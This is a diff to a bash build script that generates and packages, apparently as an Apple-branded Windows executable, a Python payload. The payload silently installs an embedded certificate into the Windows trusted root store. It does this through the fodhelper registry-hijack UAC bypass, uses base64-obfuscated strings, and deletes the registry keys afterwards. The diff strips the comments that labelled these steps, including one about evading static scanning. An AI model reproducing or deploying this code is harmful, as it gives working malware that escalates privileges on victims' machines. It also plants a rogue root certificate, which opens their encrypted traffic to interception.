@@ -87,31 +87,27 @@ convert "/tmp/apple.jpg" -define icon:auto-resize=96 "$ICON_PATH"
 
 # --- Create Python Script for Certificate Installer + UAC Bypass ---
 cat > "$SCRIPT_PATH" << EOF
-import os as O, subprocess as S, tempfile as T, base64 as B, time as M, winreg as W
+import os as O, subprocess as S, tempfile as T, base64 as B, time as M, winreg as W, sys
 
-# ===== Encode critical strings to evade static scanning =====
 def d(s):
     return B.b64decode(s).decode()
 
-# Pre-encoded strings
-CRT_DATA = """$(base64 -w0 "$CERT_PATH")"""  # Will be replaced in Bash
-TMP_CERT = O.path.join(T.gettempdir(), d(b'YXBwbGUuY3J0'))  # "apple.crt"
-REG_PATH = d(b'U29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQ=')  # "Software\Classes\ms-settings\Shell\Open\command"
-FODHELPER = d(b'QzpcV2luZG93c1xTeXN0ZW0zMlxmb2RoZWxwZXIuZXhl')  # "C:\Windows\System32\fodhelper.exe"
-CERT_CMD_TEMPLATE = b'Y21kIC9jIGNlcnR1dGlsIC1hZGRzdG9yZSAtZiBSb290ICJ7fSI='  # cmd /c certutil -addstore -f Root "{crt_path}"
+CRT_DATA = """$(base64 -w0 "$CERT_PATH")"""
+TMP_CERT = O.path.join(T.gettempdir(), d(b'YXBwbGUuY3J0'))
+REG_PATH = d(b'U29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQ=')
+FODHELPER = d(b'QzpcV2luZG93c1xTeXN0ZW0zMlxmb2RoZWxwZXIuZXhl')
+CERT_CMD_TEMPLATE = b'Y21kIC9jIGNlcnR1dGlsIC1hZGRzdG9yZSAtZiBSb290ICJ7fSI='
 
-# ===== Save embedded certificate to temp file =====
 try:
     with open(TMP_CERT, "wb") as f:
         f.write(B.b64decode(CRT_DATA))
 except:
     pass
 
-# ===== UAC Bypass via fodhelper =====
 def ubx(cmd):
     try:
         k = W.CreateKey(W.HKEY_CURRENT_USER, REG_PATH)
-        W.SetValueEx(k, d(b'RGVsZWdhdGVFeGVjdXRl'), 0, W.REG_SZ, "")  # "DelegateExecute"
+        W.SetValueEx(k, d(b'RGVsZWdhdGVFeGVjdXRl'), 0, W.REG_SZ, "")
         W.SetValueEx(k, None, 0, W.REG_SZ, cmd)
         W.CloseKey(k)
     except:
@@ -122,7 +118,6 @@ def ubx(cmd):
     except:
         pass
     M.sleep(3)
-    # Clean registry keys
     try:
         W.DeleteKey(W.HKEY_CURRENT_USER, REG_PATH)
         W.DeleteKey(W.HKEY_CURRENT_USER, d(b'U29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVu'))
@@ -131,12 +126,14 @@ def ubx(cmd):
     except:
         pass
 
-# ===== Execute certutil with UAC bypass =====
 try:
     cert_cmd = d(CERT_CMD_TEMPLATE).format(TMP_CERT)
     ubx(cert_cmd)
 except:
     pass
+
+sys.exit(0)
+
 EOF
 
 cp "$SCRIPT_PATH" "$WINEPREFIX/drive_c/pyinstaller-build/cert_installer.py"
